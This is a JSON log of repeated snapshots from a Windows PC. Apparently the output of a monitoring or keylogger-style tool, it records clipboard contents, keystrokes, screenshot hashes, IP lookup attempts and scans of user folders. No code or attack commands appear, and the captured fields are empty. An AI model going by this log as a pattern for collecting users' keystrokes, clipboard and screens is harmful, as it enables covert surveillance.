{"timestamp": "2025-06-14T08:46:39.779482+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "fbad3544e5872d7e110220315a2b545084f7931318469df4e148b5099b9050d7", "_raw_log_hash": "95512e2de77160cfa3d7e498cdef6d0d04ea6f1d17590becaf627796ea90d96e"}
{"timestamp": "2025-06-14T08:46:53.289866+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "0ec1a3068d4d73c1fcdcdd625872800e9884cca67317710adfaa4acfcc237254", "_raw_log_hash": "6725d4044babeebd23a61e46ae97be8b5a185be677231aa120355564cb11576c"}
{"timestamp": "2025-06-14T08:47:06.898201+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b1305e4e14b93f4020dc250d8a8631601499272d2ec825b69791c339dc1de822", "_raw_log_hash": "229b257100d09282b968e625d6fa8acbc642e2dd946f0e9f08cc708b3ca414bf"}
{"timestamp": "2025-06-14T08:47:20.551376+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d7c2147b11a8504abddce9492e6a0ee93968cdde997d4e6e62d7321ae6e07757", "_raw_log_hash": "f1cfe09dd3f0be8a2517d8762d4623908bdb50f25bcb919f3d80327f283ed5e8"}
{"timestamp": "2025-06-14T08:47:34.117997+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d8d118f08c420be743c7dc79f0e178e7e82c0c401da1e56dadfe04b645149edb", "_raw_log_hash": "82b703bef0a28ff1f314c803f45aab16b72f28a63a63409ba1ad9792611feb25"}
{"timestamp": "2025-06-14T08:47:47.664206+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a954415f180c4f1b84ae70d3457789dc7f2a91ef4a07d7463871a1d77e7a9e9d", "_raw_log_hash": "2e4773610521b24c8096bc01a530e378d8ba421a56b148a8f4cadbe90db86e06"}
{"timestamp": "2025-06-14T08:48:01.299027+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ce0a549e17e4029529eacc1a78d8449fb916224d645b417bb709077ac3a5544b", "_raw_log_hash": "fc1827d74122aff0c05192712618bd0cf00e07d4680ce6c3aac0ed73a2abe9ec"}
{"timestamp": "2025-06-14T08:48:14.992608+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "db8a20df77cdfc2207a8fa0330498051be3f93e3f6e4f96c7236f89a1203a425", "_raw_log_hash": "4d69964223e95922ffd7838b04fa2a56fae0ae89468a2b055946c0c3dbe03ee2"}
{"timestamp": "2025-06-14T08:48:28.843883+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "68276bbf24f8d3788f14ab4885542c1330f0e769b09583f7b274863ac65aa9a7", "_raw_log_hash": "da2a2c43f3bc210fcd9e45f44b11dc56441b93133712d5d836c6cbe02b69568a"}
{"timestamp": "2025-06-14T08:48:42.365137+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "48ea934f50c4b66e6f08633e73870a5b366436b41a20697b645eb5c7f9606868", "_raw_log_hash": "6927d5b26a6f23df9ddd6c74f0c54ca75e3505bfd9ea02c3746816929c31efc9"}
{"timestamp": "2025-06-14T08:48:55.850153+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3f405b8dc27f34caf780ee38bc0ca356f459a70c53f20f418805351454757e66", "_raw_log_hash": "d9589e3e1e335e85af6086d57db61cce444fee3e5120f0a1bc78a27a701316ea"}
{"timestamp": "2025-06-14T08:49:09.389183+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f8d9d418ac510d8d95488f499aff6f1a1a70ece25de285bebb2e74ae844dd66a", "_raw_log_hash": "ddfb1ccf8ae08f1222ea2fca46eee5ec0e1fb4349b0e16cad99f639b79a6a220"}
{"timestamp": "2025-06-14T08:49:23.040628+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "dbf19d483b7add1f25c136371c929ef11e6375e6eb9f91fd5ccebdc2f73c3b52", "_raw_log_hash": "aaf1e0521f22f592c57527e76890a5113d28f35f85df31118ac8037af2d52e71"}
{"timestamp": "2025-06-14T08:49:36.798743+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "04faf3711bf723f2b414df0009dca24eab2ec3ae66af5e43bf9bd9d90e7a4638", "_raw_log_hash": "d20f509100fb77830514015f20271fc77d96f2a9e51ce6963ea90c40fba86c8c"}
{"timestamp": "2025-06-14T08:49:50.365876+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5b779dec042ea29e8f61611c52bb9f3dc8f9b33d0ad8d686c1a0c4e2e6a3e3d3", "_raw_log_hash": "c52a9b91447b225d59c449b1bff21435ce92ed646bdb125e21775d1b62bc2c16"}
{"timestamp": "2025-06-14T08:50:03.898895+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a040f94949dab9b22519636132a1c9abcecb37888528bc74345843326afbe96e", "_raw_log_hash": "96ec465631cecad8b65a66cca503b8a1c72d8e5ba5281b3796f4908ccf9ef5a0"}
{"timestamp": "2025-06-14T08:50:17.587756+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2609881e2fbf066abaa97fddc5605a50de636d139452f82949668f77efff0c8f", "_raw_log_hash": "f3cfe9a08f959b39a9d2b34fdeb1f2e45a8d0042c973c9e6f85cae324145547a"}
{"timestamp": "2025-06-14T08:50:31.199095+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2a152679cea6c78aae51cddcf95fa1513c9a92986064e208e56807dbc29610a3", "_raw_log_hash": "012697f33cf51fad347a2bfa0bfed8e1ba94b0c8c4df6de06147ec7ad8f6c2cd"}
{"timestamp": "2025-06-14T08:50:44.938754+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "1f2a081b579a42e62c7bbbb6dbb9f66c15e035d883f0eed627886a1c6f38bd27", "_raw_log_hash": "8e5610f724f07453f5ed5c584018d01abb27a503aa5be3cbdf56091c6bfdd2dc"}
{"timestamp": "2025-06-14T08:50:58.552122+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "86b493cbeee351ee739eff7b27671c30f032c6a0ed33a04646de9615b623681c", "_raw_log_hash": "c557504b6c2de9a76b6e9f3b554168ed9b8652ceeaec4d586f56455219b41588"}
{"timestamp": "2025-06-14T08:51:12.087623+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d8548909906b87f649b3ac0c607ff26d70924a23f0a9acb856f63a93fbd0a133", "_raw_log_hash": "780fa56247c034c9bccdf18c7305c17abe7cccecb0a06e79a05dea7a23badebc"}
{"timestamp": "2025-06-14T08:51:25.791167+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f6291ee53b4974b7ddafb6c844969d8cb3c6002d957cf81ac27d27b7e384074f", "_raw_log_hash": "25e5264f883765d0eecd6d9619ff1df1df7ae2734572229e0c3a2fb56b93b0f5"}
{"timestamp": "2025-06-14T08:51:39.364575+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "37e028b9f1b5143b894a2ad3bb55dece13a9f2df6799fb04ac2bf5f688980ca0", "_raw_log_hash": "43d8073aface2d7d17e0eb287656d9c3d3b7397783979f0821ea576109ca2368"}
{"timestamp": "2025-06-14T08:51:52.912784+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b7ef0c2d82236021ba7f6f334200eebf17940fa72e547bb60ea85581346cbc2e", "_raw_log_hash": "3f88f4fb8513d3dc7a15ba26be096a7d22732ec1a6469dc8c68e4aa1763e96fb"}
{"timestamp": "2025-06-14T08:52:06.557726+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "28de7148b7b828b48bb6d3abab20d79eb4a2b82b43edcc68a641d58c402acbb3", "_raw_log_hash": "67f4c6e354204e7509a5fd524b313eca0b8b7b64e774a2164e92b35fb1c2db4a"}
{"timestamp": "2025-06-14T08:52:20.145788+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5d5bbedd73299135f299f3ceb4a5b6e85ef58ff5cb1fb18372fb3ac7e3b850fe", "_raw_log_hash": "c14172f1040e959b26d2325d32f03656cb47cdee4fa51231f41b1578a5325270"}
